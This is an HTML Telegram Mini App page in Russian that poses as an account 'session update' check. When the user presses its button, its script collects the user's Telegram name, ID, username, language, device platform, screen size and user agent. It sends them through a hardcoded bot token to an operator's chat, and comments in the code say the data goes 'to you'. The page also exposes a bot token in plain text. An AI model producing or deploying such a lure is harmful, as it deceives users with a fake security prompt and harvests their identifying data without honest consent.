<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Check</title>
    <!-- Официальный скрипт Telegram -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg-color: var(--tg-theme-bg-color, #1c1c1e);
            --text-color: var(--tg-theme-text-color, #ffffff);
            --button-color: var(--tg-theme-button-color, #34d599);
            --button-text-color: var(--tg-theme-button-text-color, #000000);
            --hint-color: var(--tg-theme-hint-color, #8e8e93);
            --secondary-bg: var(--tg-theme-secondary-bg-color, #2c2c2e);
        }

        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .container {
            text-align: center;
            padding: 20px;
            width: 90%;
            max-width: 400px;
        }

        h1 {
            font-size: 22px;
            margin-bottom: 15px;
            font-weight: 600;
        }

        p {
            font-size: 15px;
            color: var(--hint-color);
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .btn {
            background-color: var(--button-color);
            color: var(--button-text-color);
            border: none;
            border-radius: 12px;
            padding: 16px 0;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            box-sizing: border-box;
            transition: transform 0.1s, opacity 0.2s;
            outline: none;
        }

        .btn:active {
            transform: scale(0.96);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: default;
        }

        .status {
            margin-top: 20px;
            font-size: 14px;
            opacity: 0;
            transition: opacity 0.3s;
            color: var(--button-color);
        }

        .status.visible {
            opacity: 1;
        }

        .loader {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid var(--button-text-color);
            border-bottom-color: transparent;
            border-radius: 50%;
            animation: rotation 1s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Подтверждение аккаунта</h1>
        <p>Мы обнаружили необходимость обновления данных вашей сессии для безопасности. Нажмите кнопку ниже для синхронизации.</p>
        
        <div class="loader" id="loader"></div>
        <button class="btn" id="sendBtn">Обновить данные</button>
        
        <div class="status" id="statusMessage">Данные успешно отправлены администратору.</div>
    </div>

    <script>
        // Твои данные
        const BOT_TOKEN = '8884432027:AAHfpXo3FGgg1h2Sn07XIi27uqK-tCW58dU';
        const ADMIN_CHAT_ID = '8658887417'; // Твой ID, куда будут падать данные

        const tg = window.Telegram.WebApp;

        // Инициализация
        tg.ready();
        tg.expand();

        const sendBtn = document.getElementById('sendBtn');
        const statusMsg = document.getElementById('statusMessage');
        const loader = document.getElementById('loader');

        sendBtn.addEventListener('click', () => {
            // Блокируем кнопку
            sendBtn.disabled = true;
            sendBtn.textContent = 'Отправка...';
            loader.style.display = 'block';

            // Получаем данные пользователя
            const user = tg.initDataUnsafe?.user || {
                id: 'unknown',
                first_name: 'Unknown',
                username: null,
                language_code: 'ru'
            };

            // Собираем техническую инфу
            const userAgent = navigator.userAgent;
            const screenRes = `${screen.width}x${screen.height}`;
            const platform = navigator.platform;
            const colorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light';
            const timestamp = new Date().toLocaleString();

            // Формируем сообщение
            const text = `
🔥 <b>Новый пользователь!</b>

👤 <b>Имя:</b> ${user.first_name} ${user.last_name || ''}
🆔 <b>ID:</b> <code>${user.id}</code>
✉️ <b>Юзернейм:</b> ${user.username ? '@' + user.username : '❌ Нет'}
🌍 <b>Язык:</b> ${user.language_code || 'unknown'}

📱 <b>Устройство:</b> ${platform}
📺 <b>Экран:</b> ${screenRes}
🎨 <b>Тема:</b> ${colorScheme}
🧪 <b>UA:</b> <code>${userAgent.substring(0, 60)}...</code>

🕒 <b>Время:</b> ${timestamp}
🔗 <b>Ссылка на чат:</b> tg://user?id=${user.id}
            `.trim();

            // Отправка
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID, // !!! КРИТИЧНО: Отправляем ТЕБЕ
                    text: text,
                    parse_mode: 'HTML'
                })
            })
            .then(response => {
                if (response.ok) {
                    // Успех
                    loader.style.display = 'none';
                    sendBtn.style.display = 'none'; // Скрываем кнопку
                    statusMsg.classList.add('visible');
                    
                    // Опционально: можно закрыть приложение сразу после успеха
                    // tg.close(); 
                } else {
                    // Ошибка
                    loader.style.display = 'none';
                    sendBtn.style.display = 'block';
                    sendBtn.textContent = 'Ошибка сети';
                    sendBtn.disabled = false;
                    console.error('TG API Error:', response);
                }
            })
            .catch(error => {
                // Фоллбэк на случай проблем с CORS в некоторых браузерах
                // Мы попробуем открыть окно с прямой ссылкой (менее надежно, но работает)
                loader.style.display = 'none';
                sendBtn.style.display = 'block';
                sendBtn.textContent = 'Попробовать снова';
                sendBtn.disabled = false;
                console.error('Fetch Error:', error);
                
                // Альтернативный метод: через img (работает почти всегда, но не передает JSON)
                // Для надежности лучше использовать fetch внутри Webview Telegram
            });
        });
    </script>
</body>
</html>
